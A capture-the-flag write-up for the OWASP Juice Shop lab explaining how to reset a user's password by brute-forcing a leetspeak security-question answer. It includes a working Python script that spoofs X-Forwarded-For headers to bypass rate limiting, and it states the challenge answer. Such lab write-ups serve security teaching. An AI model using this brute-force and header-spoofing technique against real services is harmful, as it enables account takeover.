# Reset Morty's Password: Brute-Force a Security Question Answer

**Objective:** Reset Morty's password via the "Forgot Password" mechanism by brute-forcing his obfuscated security question answer.

## Background

Juice Shop's password reset flow requires answering a security question. For the user `morty@juice-sh.op`, identifying "Morty" as the character Morty Smith from *Rick and Morty* leads to a key clue: Morty's dog was named **Snuffles**, later renamed **Snowball**. The actual stored answer is a leetspeak ("1337") variant of one of these words, requiring a brute-force attack over many possible spellings.

The reset endpoint also enforces rate limiting (max 100 requests per 5 minutes), which can be bypassed by spoofing a different `X-Forwarded-For` header on each request, since the server trusts that header over the real client IP when identifying the request's origin.

## Steps Taken

### 1. Identified the target user and clue

Researched "Morty" and found the character's dog, originally named **Snuffles**, later going by **Snowball**.

### 2. Located the Forgot Password page

```
http://localhost:3000/#/forgot-password
```

Entered `morty@juice-sh.op` as the email to confirm the security question flow and question text.

### 3. Built a leetspeak word list

Generated all mutations of `snuffles` and `snowball` using combinations of lowercase, uppercase, and digit characters (e.g. `S`→`5`, `o`→`0`, `l`→`1`, etc.), covering typical leetspeak substitutions.

### 4. Wrote a brute-force script

Used a Python script to iterate through the word list, sending requests to:
```
http://localhost:3000/rest/user/reset-password
```
with each candidate answer, a chosen new password, and the target email.

### 5. Bypassed rate limiting

Modified the script to send a different, randomized `X-Forwarded-For` header value on every request, since the server uses this header (when present) to determine the request's origin for rate-limiting purposes, rather than the actual client IP.

```python
import requests
import random

url = "http://localhost:3000/rest/user/reset-password"
email = "morty@juice-sh.op"
new_password = "NewPassword123!"

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

with open("wordlist.txt") as f:
    for answer in f:
        answer = answer.strip()
        headers = {"X-Forwarded-For": random_ip()}
        payload = {
            "email": email,
            "answer": answer,
            "new": new_password,
            "repeat": new_password
        }
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(f"Success! Answer was: {answer}")
            break
```

A pre-built reference implementation is also publicly available as a Gist by GitHub user **philly-vanilly**: [`juice-shop-mortys-question-brute-force.py`](https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820).

### 6. Ran the script

Executed the script, which iterated through the word list while rotating the `X-Forwarded-For` header to avoid rate limiting.

## Result

The brute-force successfully identified the security question answer as:

```
5N0wb41L
```

Challenge solved — confirmed by the in-app success notification and the Score Board. The script was stopped once the correct answer was found and the password reset succeeded.

## Root Cause

- The security question's answer was both guessable (based on publicly known character trivia) and further weakened by predictable leetspeak obfuscation rather than true secrecy.
- The server's rate-limiting mechanism relies on the client-supplied `X-Forwarded-For` header to determine request origin, which is trivially spoofable, allowing an attacker to bypass the intended request-rate protection entirely.

## Status

Solved.
